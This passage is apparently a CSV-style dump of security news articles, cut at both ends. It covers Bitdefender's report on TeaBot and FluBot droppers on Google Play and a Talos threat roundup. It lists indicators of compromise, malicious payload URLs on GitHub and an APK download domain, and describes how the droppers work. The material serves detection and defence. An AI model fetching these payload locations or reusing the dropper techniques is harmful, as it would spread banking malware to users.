bypass the service’s cryptographic service provider. The Low-rated bug is a sandbox escape in Microsoft Edge (Chromium-based) that requires user interaction. However, the CVSS for this bug is 7.7, which Mitre classifies as “High.” Microsoft claims the user interaction involved justifies the Low rating, but I would still treat this as an important update and not delay the rollout. No new advisories were released this month. The latest servicing stack updates can be found in the revised ADV990001 . Looking Ahead The next Patch Tuesday falls on October 11, and we’ll return with details and patch analysis then. Don’t forget - I’ll be premiering the Patch Report webcast tomorrow on our YouTube channel at 9:00 am Central time. I hope you’re able to tune in and check it out. Until then, stay safe, happy patching, and may all your reboots be smooth and clean!"
86fcc465-4f73-561c-9d88-42495b606a1c,26-January-2022,New FluBot and TeaBot Global Malware Campaigns Discovered,"Bitdefender says threats like TeaBot and FluBot are constantly changing and changing their tactics. the threats are changing the way they are delivered to victims. Bitdefender intercepted over 100,000 malicious SMS messages tied to FluBot malware.","Some malware and phishing campaigns have short lives, tending to dissipate after they're identified by security solutions. Others seem to survive year after year, with victims falling for the same tricks. Banking trojans such as TeaBot and FluBot and the ""Is it you in the video?"" scams are just two examples of threats that adapt to remain relevant. The impact of TeaBot and FluBot trojans became apparent last year globally. Threat actors used mockups of popular apps, applications posing as ad-blockers and sent SMS messages from already-compromised devices to spread the malware organically. The banking trojans' functionality are straightforward - they steal banking, contact, SMS and other types of private data from infected devices. They have an arsenal of other commands available, including sending an SMS with content provided by the command and control (CnC). This allows its operators to change targeted banks and other features on the fly, depending on the countries affected. These threats survive because they come in waves with different messages and in different time zones. While the malware itself remains pretty static, the message used to carry it, the domains that host the droppers, and everything else is constantly changing. Since the beginning of December, Bitdefender Labs intercepted over 100,000 malicious SMS messages tying to distribute FluBot malware by analyzing telemetry from the new Scam Alert feature , now available by default in Bitdefender Mobile Security & Antivirus. Findings indicate attackers are modifying their subject lines and using older yet proven scams to entice users to click. Additionally, attackers are rapidly changing the countries they are targeting in this campaign. The following is a detailed overview of the findings: With the help of Scam Alert, we've seen how this malicious SMS now informs users of potential problems with parcel delivery and tells users that Flash player needs an update, that they have a missed voice mail or that some Android component needs upgrading. The FluBot operators target different zones for short periods - sometimes just a few days. For example, in the month between Dec. 1 of last year and Jan. 2 of this year, the malware was highly active in Australia, Germany, Spain, Italy and a few other European countries. Starting Jan. 3, 2022 the attackers began to look at other countries to spread their malware, including Poland, Romania and the Netherlands. In fact, Romania has been one of the main targets in the past few days. The worldwide distribution of the past couple of waves we've observed in the past couple of months shows Australia as a primary target. A simple phishing campaign is still making the rounds on social media, primarily through Facebook's Messenger. Users receive a message from a friend in their list with a question (“Is this you in this video?“ or some variation) and a link. When the victim clicks on the link, it usually redirects them to a fake Facebook login that gives attackers direct access to credentials. The phishing campaign is already a couple of years old, and it's persistent. It shows up on Facebook in waves and doesn't seem to disappear. We mention this campaign because FluBot operators have adopted a similar message for their malware. In this situation, victims receive an SMS message along the lines of “Is this you in this video?.” The goal is the same - to somehow mislead people into installing the software under some pretext, by telling them that Flash or some Android component actually needs an upgrade after they've opened the link informing them they could be in a video. This new vector for banking trojans shows that attackers are looking to expand past the regular malicious SMS messages. In fact, Romania has been one of the main targets in the latest ""Is this you in this video?"" campaign distributed through Messenger. We've intercepted over 10,000 malicious URLs just in the past 30 days. While the two campaigns are likely not related, it’s interesting to see how one group uses the methods of another. Most believe the official Google Play Store is completely safe to download and vetted for security purposes before they become available to the public. That's true most of the time but not always. Sometimes malicious apps are missed and stay active on official stores accruing thousands of downloads before they are noticed and taken down. We found something strange during our investigation of the new FluBot campaign. We initially believed Flubot was being installed on devices without a malicious SMS being sent but discovered that a different malicious banking bot was installed on the same device. We determined it was a TeaBot variant, and further investigation led to the finding of a dropper application in Google Play Store named the 'QR Code Reader - Scanner App', with over 100,000 downloads, that has been distributed 17 different TeaBot variants for a little over a month. Bitdefender's security researchers have found that the 'QR Code Reader - Scanner App' found in the Google Play Store is likely a heavily encrypted TeaBot dropper. In just 30 days, it dropped 17 variants of the malware. The application itself is not malicious, and it does offer the promised functionality, but that's a known tactic. The malicious code within the app has a minimal footprint, as the authors were careful about not triggering security heuristics. The path followed after installation is relevant in itself. When the user starts the Android app, it also starts a background service that checks the country code of the current registered operator (or the cell nearby). If the country starts with a ""U"" or is unavailable, the app skips executing the malicious code, which means that countries like Ukraine, Uzbekistan, Uruguay and the US are skipped. If the app passes the check, it retrieves the context of a settings file from GitHub from the following address: raw.githubusercontent[.]com/isaacluten/qrbarcode/main/settings This file contains a different GitHub repository file link pointing to the actual payload to download. This settings file, from the QR Code Reader repository, has the URL changed whenever a different payload URL is needed or even removed if the authors wish to deactivate the malicious behavior temporarily. If there is a URL in the settings file, the APK is downloaded and saved to '/sdcard/Android/data/com.lorankey.qrcode/files/Download/addonqrapp.apk', and the installation is initiated. The app itself presents a fake UI saying that an update is required, and users are instructed to allow the Android app to install third-party packages. Combining our telemetry with GitHub's repositories history, we identified a minimum of 17 different versions of TeaBot that were deployed to victims from Dec. 6 of last year to Jan. 17 of this year. The malware has a hardcoded GitHub URL to get the next payload (another GitHub URL). Looking at GitHub's history and our own analysis, we have the following accounts associated with this threat: GitHub user Timeline Purpose github.com/isaacluten Created 2021.12.06 Configuration files storage; indicates the payload location github.com/lotterevich First seen 2021.12.06 Last seen 2021.12.17 Held payloads, but was deleted github.com/rosamundstone393 Created 2021.12.07 FluBot payloads are currently uploaded here Between the accounts, all payloads' configurations seen were as follows: Content of raw.githubusercontent.com/isaacluten/qrbarcode/main/settings 1.0.0<<https://github.com/rosamundstone393/maina/blob/main/today.apk?raw=true 1.0.0<<https://github.com/lotterevich/lott/blob/main/today.apk?raw=true 1.0.0<<https://github.com/lotterevich/lott/blob/main/fullymain.apk?raw=true 1.0.2 1.0.1 1.0.0<<https://github.com/lotterevich/lott/raw/main/maina.apk 1.0.0 1.0.0<<https://github.com/lotterevich/lott/raw/main/Flashlight.apk Currently, all payloads are uploaded as ""1.0.0<<hxxps://github.com/rosamundstone393/maina/blob/main/today.apk?raw=true"" There is one repository for payload configuration for the QR Code Reader app, and another repository was created for an app named 2FA Authenticator, also a dropper, that was just released. The QR Code Reader application is available for download globally but, oddly, our telemetry shows the vast majority of scans on the dropped payloads come from Great Britain. We presume that the authors of the malware have made specific ad campaigns targeting that area. Bitdefender’s security researchers also found one of the ways this app manages to spread through the userbase. Victims likely see an ad for this malicious app in other legitimate Android applications and install it through that vector. The attackers pay to appear in Google Ads, giving them screen time in an app that could have millions of users. The 2FA Authenticator we found is a similar malicious dropper currently available on the Play Store. Fortunately, this version of the malware dropper had no chance to infect as many victims because we caught it as soon as it was released. All countries that are excluded by the malware by ISO codes: 'UG' 'UGANDA' 'UA' 'UKRAINE' 'US' 'UNITED STATES' 'UM/UMI' 'UNITED STATES MINOR OUTLYING ISLANDS' 'UY' 'URUGUAY' 'UZ' 'UZBEKISTAN' Searching for similar dropper behavior, we found other applications that used to be available on Google Play and distributed TeaBot. As far as we can tell, they've been silently removed without anyone noticing they were ever live. App name App package name Developer Last known download count Last seen on Play QR Scanner APK com.paccinisantino861.qrscanner santino paccini 10,000+ 2022.01.07 QR Code Scan com.scannet.qrbar Bailey Leightonware 10,000+ 2021.04.21 Smart Cleaner com.butkusnedas.smart.cleaner Butkusnedas 1,000+ 2021.12.17 One relevant feature for this malware is the complete lack of malicious code in the initial versions. Attackers initially submit clean apps and introduce the malicious component in subsequent updates. The three apps mentioned above provide the perfect example of this behavior. App name Version code Version name APK MD5 QR Scanner APK 4 2.4 bea21055cda8c81b4e5a46c1fac2b570 0f621dbe75d1d223353e9a74209c43cb QR Code Scan 4 1.03 125a0b5013e3ef4b6a4af2d184b68a0b Smart Cleaner 2 2.0 77dd1738f3109a15a9b38db2845bbb54 3 3.0 1c486fe75688a2fd67b26c22d0f85adc df7770114becbbee2f06be8947039c31 The Weather Cast application by Weather Live is an active app on Google Play that also drops banking malware. Determining the exact nature of the malware is challenging because threat groups copy much of the code from one malware to another, following up with heavy encryption to obfuscate the code. In the end, this only makes it more difficult to pinpoint the exact version. It doesn’t affect the ability of Bitdefender's Mobile Security & Antivirus to stop the malicious behavior. This malicious dropper retrieves the malware from its firebase (weather-live-a2756.firebaseio.com) database: The firebase currently indicates that this banking malware has been dropped on 274 victims, but the actual number could be a lot bigger, given that the app is not new. It's also likely that 10,000 downloads indicated on Google Play are not all real user downloads. The malicious payload is saved as SampleDownloadApp.apk on the file system and triggers the regular to install. Currently, although the firebase returns the download URL is currently down (polarnauc.com/rm71.apk), our telemetry indicates that victims downloaded the malicious banker trojan app. Weather Cast dropper application 05a041e47e305a4b2327f0e46d9d385f 7392e69e36ceb88425c1d8a421976a0d 773f698e035cfe0a9b642428a028405f d600c4a4466da09e239c855e19addd5a 575c0d28e7bf5198ffe7bf5950e119f4 e652412ac7de94fdfcb7c2a6e4a0fcc0 Another weather application we found is named Weather Daily from WeatherDaily, and it's still on Google Play, with the same malicious download capability. This application has the same firebase URL used in our first, thus it is also inactive at this point. Weather Daily dropper application 906166b5f0478083002fa2766f7f1cce bbefb28d7bdf997ac4d5ad747f62a0b3 9eb12035c0539b768e25581c9a425ff6 12dc7c3768430ade2ff4d2533bad5fb5 01b347ab6b147c02b20cef61bc50089b 568fbec1a9696da35af3c7dc277d6397 8cb1700b8bc2b92ef767bc04f4f02189 5a5ecf6b28bcae06b590df3a622c4401 7da32784fa162e59b216d7ea21476520 cdba81c1e0e9be347dd3072b2bcfb335 8dff2bd7449f510bed9c0949432dda9f 424c34c7d4ab5b9a808d2df211551336 48e3c1b0bf0c8efcf78e26605c74fa3c 7fe5ffbd394e5a92b649fa44a6cca1d3 3625dcca6b829d888235e001eff9f069 Indicators of compromise (IOC) We already notified Google and GitHub regarding all of this malicious activity and GitHub took down the accounts. Dropper MD5 Dropper package name 6be155472cedc94d834a220b6217c029 com.lorankey.qrcode 125a0b5013e3ef4b6a4af2d184b68a0b com.scannet.qrbar 57f6576705e7e8b11fbd3480b7602f25 com.qrcodeapp.qrcodeapp 77dd1738f3109a15a9b38db2845bbb54 com.butkusnedas.smart.cleaner 1c486fe75688a2fd67b26c22d0f85adc com.butkusnedas.smart.cleaner df7770114becbbee2f06be8947039c31 com.butkusnedas.smart.cleaner bea21055cda8c81b4e5a46c1fac2b570 com.paccinisantino861.qrscanner 0f621dbe75d1d223353e9a74209c43cb com.paccinisantino861.qrscanner 05a041e47e305a4b2327f0e46d9d385f com.weatherlive.android 7392e69e36ceb88425c1d8a421976a0d com.weatherlive.android 773f698e035cfe0a9b642428a028405f com.weatherlive.android d600c4a4466da09e239c855e19addd5a com.weatherlive.android 575c0d28e7bf5198ffe7bf5950e119f4 com.weatherlive.android e652412ac7de94fdfcb7c2a6e4a0fcc0 com.weatherlive.android 906166b5f0478083002fa2766f7f1cce bbefb28d7bdf997ac4d5ad747f62a0b3 9eb12035c0539b768e25581c9a425ff6 12dc7c3768430ade2ff4d2533bad5fb5 01b347ab6b147c02b20cef61bc50089b 568fbec1a9696da35af3c7dc277d6397 8cb1700b8bc2b92ef767bc04f4f02189 5a5ecf6b28bcae06b590df3a622c4401 7da32784fa162e59b216d7ea21476520 cdba81c1e0e9be347dd3072b2bcfb335 8dff2bd7449f510bed9c0949432dda9f 424c34c7d4ab5b9a808d2df211551336 48e3c1b0bf0c8efcf78e26605c74fa3c 7fe5ffbd394e5a92b649fa44a6cca1d3 3625dcca6b829d888235e001eff9f069 com.app.weatherclient 3b24fc4b75c3a2a3016a1aadab12f4b7 org.otpauthverified.android.andotp TeaBot payload MD5 11d60ea8b765805fd21ccaa394c0f1c5 199a05563aac440df1ece5900dc8728b 243063fdfc605e52e415286d441c64cd 27c7610b496812ab44734d02ab84298e 3acd1e3fc3a9748fee13550cfe86491f 3ed22780949ae9c756186451b12e49c9 63889a8f68d33314435be05e519b2121 761d47788376087a8d9ebd79966d17ce 8e9a27c2b2c78282536e747adbc32ff1 933e4941511c990c05c1a2f536eb73f2 c4648f55a3325853f435ce04b226eca5 d35101685436f5599d314e2843647424 db3ba9bd23563c720d793e397fc4db80 e5a3d989403bdc03132c1f5092a8d3fa f25da3ec09dbc26c30fd0734500f607b ff6184928f9704b482d4b7e157bf479c ffe5cb26952d97864dc643091450bd16 23e49cc28a5feeed4b9e362aa43e158a 770b95a7894b32b139a9bf93bfaf7d26 ad96f5c40a8bdff8c682ecb7982aa19d 0333d85a2c9e36ea7a84aad42b69e969 0801afc7101311e76e1b38484e19cec6 3cf74827168efbcd58633b929b4f6e94 5e81fc20f164ca96f3b57338493c4fcf Weather app dropped malware cbd060ded5a83b5f874901e8c60bfb3d 2776882a50b86a5829b7063fdcbe256f 6ad5b3b9275df2cbf1671af2f7ae25e2 0585c9238714c5c44614e1594e73287e d3a1b6a21d4601cc6cd6a675790eda4b Weather app payload URL polarnauc.com/rm71.apk Associated GitHub accounts: GitHub user github.com/isaacluten github.com/lotterevich github.com/rosamundstone393 This article is available courtesy to the Bitdefender Mobile Threats team."
4bd0b95f-da9b-5782-92e8-f57be9927d59,07-October-2022,Threat Roundup for September 30 to October 7,"Talos releases a roundup of the most prevalent threats we've observed between Sept. 30 and Oct. 7. Talos highlights key behavioral characteristics, indicators of compromise, and how customers can protect themselves. The most prevalent threat categories include Win.Dropper, Banload, and Win.Trojan.","Today, Talos is publishing a glimpse into the most prevalent threats we've observed between Sept. 30 and Oct. 7. As with previous roundups, this post isn't meant to be an in-depth analysis. Instead, this post will summarize the threats we've observed by highlighting key behavioral characteristics, indicators of compromise, and discussing how our customers are automatically protected from these threats. As a reminder, the information provided for the following threats in this post is non-exhaustive and current as of the date of publication. Additionally, please keep in mind that IOC searching is only one part of threat hunting. Spotting a single IOC does not necessarily indicate maliciousness. Detection and coverage for the following threats is subject to updates, pending additional threat or vulnerability analysis. For the most current information, please refer to your Firepower Management Center, Snort.org , or ClamAV.net . For each threat described below, this blog post only lists 25 of the associated file hashes and up to 25 IOCs for each category. An accompanying JSON file can be found here that includes the complete list of file hashes, as well as all other IOCs from this post. A visual depiction of the MITRE ATT&CK techniques associated with each threat is also shown. In these images, the brightness of the technique indicates how prevalent it is across all threat files where dynamic analysis was conducted. There are five distinct shades that are used, with the darkest indicating that no files exhibited technique behavior and the brightest indicating that technique behavior was observed from 75 percent or more of the files. The most prevalent threats highlighted in this roundup are: Threat Name Type Description Win.Dropper.Formbook-9972419-1 Dropper Formbook is an information stealer that attempts to collect sensitive information from an infected machine by logging keystrokes, stealing saved web browser credentials, and monitoring information copied to the clipboard. Win.Downloader.Banload-9973408-0 Downloader Banload is a banking trojan believed to be developed by Brazilian cybercriminals and is used primarily to infect machines in Latin America. One notable aspect of Banload is it's use of custom kernel-drivers to evade detection. Win.Trojan.Zusy-9972437-0 Trojan Zusy, also known as TinyBanker or Tinba, is a trojan that uses man-in-the-middle attacks to steal banking information. When executed, it injects itself into legitimate Windows processes such as ""explorer.exe"" and ""winver.exe"". When the user accesses a banking website, it displays a form to trick the user into submitting personal information. Win.Ransomware.TeslaCrypt-9972505-0 Ransomware TeslaCrypt is a well-known ransomware family that encrypts a user's files with strong encryption and demands Bitcoin in exchange for a file decryption service. A flaw in the encryption algorithm was discovered that allowed files to be decrypted without paying the ransomware, and eventually, the malware developers released the master key allowing all encrypted files to be recovered easily. Win.Ransomware.Cerber-9972520-0 Ransomware Cerber is ransomware that encrypts documents, photos, databases and other important files. Historically, this malware would replace files with encrypted versions and add the file extension "".cerber,"" although in more recent campaigns, other file extensions are used. Win.Virus.Xpiro-9972647-1 Virus Expiro is a known file infector and information-stealer that hinders analysis with anti-debugging and anti-analysis tricks. Win.Trojan.Zbot-9972724-0 Trojan Zbot, also known as Zeus, is a trojan that steals information, such as banking credentials, using methods such as key-logging and form-grabbing. Win.Dropper.Kuluoz-9972735-0 Dropper Kuluoz, sometimes known as ""Asprox,"" is a modular remote access trojan that is also known to download and execute follow-on malware, such as fake antivirus software. Kuluoz is often delivered via spam emails pretending to be shipment delivery notifications or flight booking confirmations. Win.Trojan.Qakbot-9972834-1 Trojan Qakbot, aka Qbot, has been around since at least 2008. Qbot primarily targets sensitive information like banking credentials but can also steal FTP credentials and spread across a network using SMB. Threat Breakdown Win.Dropper.Formbook-9972419-1 Indicators of Compromise IOCs collected from dynamic analysis of 10 samples Registry Keys Occurrences <HKLM>\SOFTWARE\WOW6432NODE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN Value Name: WindowsUpdate 2 <HKLM>\SOFTWARE\WOW6432NODE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN Value Name: AGP Manager 1 <HKCU>\SOFTWARE\VB AND VBA PROGRAM SETTINGS 1 <HKCU>\SOFTWARE\VB AND VBA PROGRAM SETTINGS\SETTINGS 1 <HKCR>\LOCAL SETTINGS\MUICACHE\82\52C64B7E Value Name: LanguageList 1 <HKCU>\SOFTWARE\VB AND VBA PROGRAM SETTINGS\SETTINGS Value Name: GetCOOKIESreg 1 <HKLM>\SOFTWARE\WOW6432NODE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN Value Name: AutoUpdate 1 Mutexes Occurrences 8-3503835SZBFHHZ 7 1N6PO-QCTT825WY- 2 073A3D-6T418-C-B 2 73M9N-T0-UB83K6J 1 S-1-5-21-2580483-1244465298972 1 3MAM487FD866043M 1 S-1-5-21-2580483-12443106840201 1 S-1-5-21-2580483-124423447652 1 S-1-5-21-2580483-12443999912674 1 0Q85PR27T0CZAGEI 1 Global\{7c2a2886-3e3d-47a1-aa60-5afb9d57c7cc} 1 IP Addresses contacted by malware. Does not indicate maliciousness Occurrences 34[.]102[.]136[.]180 6 142[.]251[.]41[.]19 3 23[.]227[.]38[.]74 2 198[.]54[.]117[.]210/31 2 199[.]59[.]243[.]222 2 198[.]54[.]117[.]218 1 198[.]54[.]117[.]216 1 23[.]227[.]38[.]32 1 149[.]154[.]167[.]220 1 185[.]107[.]56[.]59 1 52[.]20[.]84[.]62 1 99[.]83[.]154[.]118 1 52[.]86[.]6[.]113 1 35[.]227[.]197[.]36 1 35[.]164[.]33[.]0 1 162[.]241[.]203[.]161 1 76[.]76[.]21[.]123 1 69[.]163[.]224[.]231 1 104[.]247[.]82[.]92 1 194[.]5[.]98[.]213 1 216[.]40[.]34[.]41 1 185[.]104[.]45[.]63 1 154[.]218[.]122[.]2 1 207[.]60[.]202[.]87 1 45[.]77[.]55[.]161 1 *See JSON for more IOCs Domain Names contacted by malware. Does not indicate maliciousness Occurrences www[.]kice1[.]xyz 1 www[.]ltgpd[.]com 1 www[.]fbo[.]app 1 www[.]texasonmission[.]com 1 www[.]omgsweepsship[.]com 1 www[.]chadwelchart[.]com 1 www[.]fabricsandfashion[.]com 1 www[.]565548[.]com 1 www[.]digigold[.]info 1 www[.]rooterphd[.]com 1 www[.]usuariosconsultasnet[.]store 1 www[.]xlgzkg[.]com 1 www[.]stjohnzone6[.]com 1 www[.]co-gpco[.]com 1 www[.]idaparry[.]cfd 1 www[.]mr5g[.]com 1 www[.]mintager[.]com 1 www[.]zjpbhsuz[.]top 1 www[.]tigermedlagroup[.]com 1 www[.]unclonedmarketingschool[.]com 1 www[.]manaako[.]com 1 www[.]sagaming168[.]info 1 www[.]jpearce[.]co[.]uk 1 www[.]boxofberries[.]com 1 www[.]ukcarbonoffsetting[.]com 1 *See JSON for more IOCs Files and or directories created Occurrences %HOMEPATH%\temp 10 %TEMP%\RegSvcs.exe 2 \5_74\nppwa.xls 1 %HOMEPATH%\4_63\thwkrjmb.xml 1 %TEMP%\5_102\smvado.ini 1 %APPDATA%\7_25\dqlhevp.dat 1 \5_74\peaxwfuc.icm 1 %HOMEPATH%\4_63\ugmtasr.icm 1 %TEMP%\5_102\vblguxk.mp3 1 %APPDATA%\7_25\egkaa.txt 1 \5_74\pxbnv.msc 1 %HOMEPATH%\4_63\uldu.xl 1 %TEMP%\5_102\vjxwe.fip 1 %APPDATA%\7_25\gdlnews.log 1 \5_74\qjigr.pif 1 %HOMEPATH%\4_63\vgdifjj.msc 1 %TEMP%\5_102\wgbmm.icm 1 %APPDATA%\7_25\gjdv.txt 1 \5_74\qscumbks.cpl 1 %HOMEPATH%\4_63\xekqtqbfs.log 1 %TEMP%\5_102\wjiawtugb.xls 1 \5_74\qxoa.dat 1 %APPDATA%\7_25\hlgdgmodk.exe 1 %TEMP%\5_102\wwhjv.chi 1 \5_74\sovh.xls 1 *See JSON for more IOCs File Hashes 02bdbd4777fc54081f239ce8936bb56d899ec58fe61437875f09227a55a74920 24945c49bbd2d14de4d8bcfe1b382d77a8a25d6432993d8abce14149234c9d83 2587b76912cdfbb81fb4a07c9a2747d0ed8177eb6b5237e7ef945fd912c19f9c 3ab1cc60bd5dca00fc6cad5cf3c0a7cccea610b20027c9db6b45f0b41860fba5 46837b2b83edea93a312915b020a2aad926e18fcee577c8442853ebb8fabea13 52f9dd59ecdb5aed12a20226b0b53454f1f7f8e48eb3c3d3189511007c38863a 75e94edca8e24facdf40d786d44e9c4573e746d7da7445184d0b31ad9314a781 8185505ac7d543abcecc7118a29a4ba28534d12226928854e968e2adb1440c55 87fdf41f3af47dc20348fe21148546a943111c455ffb9a8cd73b1beb77513ce4 b0581f39843e7c4c2c91aac86855d2638f87347e029ea878dac555c9d49a0059 Coverage Product Protection Secure Endpoint Cloudlock N/A CWS Email Security Network Security Stealthwatch N/A Stealthwatch Cloud N/A Secure Malware Analytics Umbrella WSA Screenshots of Detection Secure Endpoint Secure Malware Analytics MITRE ATT&CK Win.Downloader.Banload-9973408-0 Indicators of Compromise IOCs collected from dynamic analysis of 25 samples Registry Keys Occurrences <HKCR>\LOCAL SETTINGS\MUICACHE\82\52C64B7E Value Name: LanguageList 16 <HKCU>\SOFTWARE\MICROSOFT\INTERNET EXPLORER\SEARCHSCOPES\{0633EE93-D776-472F-A0FF-E1416B8B2E3A} Value Name: FaviconPath 14 <HKCU>\SOFTWARE\MICROSOFT\INTERNET EXPLORER\SEARCHSCOPES\{0633EE93-D776-472F-A0FF-E1416B8B2E3A} Value Name: Deleted 14 <HKCU>\SOFTWARE\MICROSOFT\INTERNET EXPLORER\SEARCHSCOPES Value Name: DefaultScope 14 <HKCU>\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\EXT\STATS\{761497BB-D6F0-462C-B6EB-D4DAF1D92D43} 14 <HKCR>\LOCAL SETTINGS\MUICACHE\82\52C64B7E Value Name: @C:\Windows\system32\DeviceCenter.dll,-2000 10 Mutexes Occurrences Global\95764121-4446-11ed-9660-001517ca4fbc 1 Global\95659781-4446-11ed-9660-0015171b6930 1 IP Addresses contacted by malware. Does not indicate maliciousness Occurrences 142[.]251[.]32[.]110 13 142[.]251[.]35[.]164 13 142[.]251[.]40[.]142 13 13[.]107[.]21[.]200 7 94[.]23[.]250[.]51 1 Domain Names contacted by malware. Does not indicate maliciousness Occurrences www[.]bing[.]com 14 www[.]google[.]com 13 picasaweb[.]google[.]com 13 get[.]google[.]com 13 goo[.]gl 11 realamizades[.]com 8 mc8park[.]com[.]br 5 www[.]acheiarte[.]com 1 Files and or directories created Occurrences %TEMP%\config.log 14 %HOMEPATH%\AppData\LocalFiles 14 %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Atalho_.pif 14 File Hashes 088010ddb5193de497c632c7843682905ae4877301ce593424aac87acbeff479 14787f442cd48c7b204f9718b22f64fab14dd54ed7bd506ef30c6a3d80cd7896 2be840d1782207d25aaa1572809bb5bed91f149aa8214d542d6854099a8c78e7 349fe84e2af3a05aea74e79976efb1474631c0f46e1a8d961d943a0d185e8a51 4667b78d423c3f8e94a1ff6cb4a31aec7398a824159cefd78ad73582f3b3fdf1 57e9911db668b3def30a7cb073f08d8f454366b6c3637f2fdb437bc3c61d2936 5bd3faee290e5ce04fec62a8f79159398639a1c0ab603239670e409af7fd5e79 62adb1e9354bc8a93379ab3aa6b2410f8b2e00978b19c624eb62d9c912bb1fb8 62f238cf96f906e0d7a118d19a752a78d7d95007c997575d781da5316045ccec 69798312028fe674fcecb0993cffaef2f0f6321f7d96516c63fca400594f08f0 6a0b4688de97b2d334fb43370275003e086088d53a7a4ac9aa5609943e0f98b8 6e6a8f094a4aa2e428d1d8c47afd77d32b23286af2b46a6cb6fc171efd1e7572 6f9fda4380c33497e187d5ce0e99d8f28aa63e662252b1e2f2ca4c0c1c80d2e4 7182d670734aa4eddd53c107c017c576a5e48335f743940fd700b0096d0780ca 7c2e9fbac433fed50ddbca31627cba58c8e86e623b941405b72dd0935992cab8 7e9ce12462a6462e5ea3335c00fe4b61327d4fc1db52faac068a04bc6ac8b60a 80a413bf7a8b77b51874eef7ad3571389bfe6fb7a70a1e5511603fd66180a892 880675bfc7c14d7ecb9c00bbbce7b5ed3dbb59ddb3777686fd12e643ba78d568 8e4ba813aa375aaa3bfe3f96462ced837f12a0f0a58362f3507cfd5fb5c18e32 92a5792f78ab05da79ed8797d359e9b2219274a36615141896df2159d3baccc1 aa6422f84e14d0b9d382f122f8e117860ab789fc5067245ebb39fb883f6d354c b5df2a668ea57041f56d69b2ca2979659a240b7056657e5392c525745e79305a b8b45e2a659226f461c127712272176ed69219af1944ae5e8b65551838a3441f b982e00e6d06b46b8e8ce33503883b3f6a1b1e609ca178245a8777b53a5a6f1e bd8482492f5a716f3f4352a5bc2571c143748a5fc4e66637e776d7a752a75c68 *See JSON for more IOCs Coverage Product Protection Secure Endpoint Cloudlock N/A CWS Email Security Network Security Stealthwatch N/A Stealthwatch Cloud N/A Secure Malware Analytics Umbrella N/A WSA N/A Screenshots of Detection Secure Endpoint Secure Malware Analytics MITRE ATT&CK Win.Trojan.Zusy-9972437-0 Indicators of Compromise IOCs collected from dynamic analysis of 27 samples Registry Keys Occurrences <HKCR>\LOCAL SETTINGS\MUICACHE\82\52C64B7E Value Name: LanguageList 27 <HKLM>\SYSTEM\CONTROLSET001\ENUM\SW\\ASYNCMAC Value Name: CustomPropertyHwIdKey 1 <HKCR>\LOCAL SETTINGS\MUICACHE\82\52C64B7E Value Name: @explorer.exe,-7001 1 Mutexes Occurrences Local\10MU_ACB10_S-1-5-5-0-67863 27 Local\10MU_ACBPIDS_S-1-5-5-0-67863 27 Local\WinSpl64To32Mutex_10960_0_3000 27 IP Addresses contacted by malware. Does not indicate maliciousness Occurrences 20[.]109[.]209[.]108 16 20[.]72[.]235[.]82 11 Domain Names contacted by malware. Does not indicate maliciousness Occurrences windowsupdate[.]microsoft[.]com 27 Files and or directories created Occurrences %TEMP%\236b0f4b7893907bb0dc93af0c2a505ca3af3d5f9f6bb9128c97d7f3cbcfa9c1.rtf 1 %TEMP%\temp_cab_-1226192130.cab 1 %TEMP%\~$6b0f4b7893907bb0dc93af0c2a505ca3af3d5f9f6bb9128c97d7f3cbcfa9c1.rtf 1 %TEMP%\2e8f00a6543ebed2e4a822d39a86e228f704656fbc75d687ad2d98b5ffd7e9be.rtf 1 %TEMP%\temp_cab_-1226182504.cab 1 %TEMP%\msoCD0.tmp 1 %TEMP%\~$8f00a6543ebed2e4a822d39a86e228f704656fbc75d687ad2d98b5ffd7e9be.rtf 1 %TEMP%\2f3c90bf18457463a03e1f14decc069f09aa7be83d865aaee07dcfb573fbded5.rtf 1 %TEMP%\2d5ff462b24139471954cecb53b8c32d786cca7f0dbe8b659ca54e1d4dacaf6e.rtf 1 %TEMP%\temp_cab_-1226182036.cab 1 %TEMP%\~$3c90bf18457463a03e1f14decc069f09aa7be83d865aaee07dcfb573fbded5.rtf 1 %TEMP%\temp_cab_-1226190663.cab 1 %TEMP%\~$5ff462b24139471954cecb53b8c32d786cca7f0dbe8b659ca54e1d4dacaf6e.rtf 1 %TEMP%\48f8c92e3b3d82bdc011476b5aa012a46a849a2229714bae4166b00d9b09d122.rtf 1 %TEMP%\temp_cab_-1226173144.cab 1 %TEMP%\2f96ceac3a3043d57e6df78df5cd36b3ee2f79d0a983e454adc0baa22c7880ce.rtf 1 %TEMP%\~$f8c92e3b3d82bdc011476b5aa012a46a849a2229714bae4166b00d9b09d122.rtf 1 %TEMP%\temp_cab_-1226182801.cab 1 %TEMP%\msoC82.tmp 1 %TEMP%\~$96ceac3a3043d57e6df78df5cd36b3ee2f79d0a983e454adc0baa22c7880ce.rtf 1 %TEMP%\50891ef026bd10528bc51972ac5bee469bf5a28322f39dbb5b68098d7ba45971.rtf 1 %TEMP%\temp_cab_-1226173675.cab 1 %TEMP%\~$891ef026bd10528bc51972ac5bee469bf5a28322f39dbb5b68098d7ba45971.rtf 1 %TEMP%\6bc6ecc0f25d2472fc1600c031de35c61603c07b530f5a10d3a3a5ceac700afd.rtf 1 %TEMP%\temp_cab_-1226164907.cab 1 *See JSON for more IOCs File Hashes 01c0c7f67c0b7f80af1dac23face65820c076b8cf819a0834cba2c9c4821cbd8 02d85c839f268ddc7775fa3b97a5edffbc4a56cd38f998ca3a855893325e3b22 08b7644d1f878d4d4f037d6bc0935181c70e30517ec10a0e2ef9a6664ad5937b 098fce3888092c3ea6a14d64f5ae321335e6413317afb21106718b978a131363 09d0f73b9518e447dad0bdaf75c18a984a69717ceaeab7e18eff40de34895340 0bcf8c547d9bf981b43fc911839fa20fd03a002664aa2612a83f77a21c2bc704 0d1179862c1eff540972af18d1ab513837fca591311661983c2c60c625a67e6d 107823ce4680d6dc30869e5fb5a8d915baf080e2a2fe5ec8de709f7a1b14b9b0 15f841285ed01805c593d6b73c617f29264fb3ccab3b59ee379db58c73f21eff 236b0f4b7893907bb0dc93af0c2a505ca3af3d5f9f6bb9128c97d7f3cbcfa9c1 2d5ff462b24139471954cecb53b8c32d786cca7f0dbe8b659ca54e1d4dacaf6e 2e8f00a6543ebed2e4a822d39a86e228f704656fbc75d687ad2d98b5ffd7e9be 2f3c90bf18457463a03e1f14decc069f09aa7be83d865aaee07dcfb573fbded5 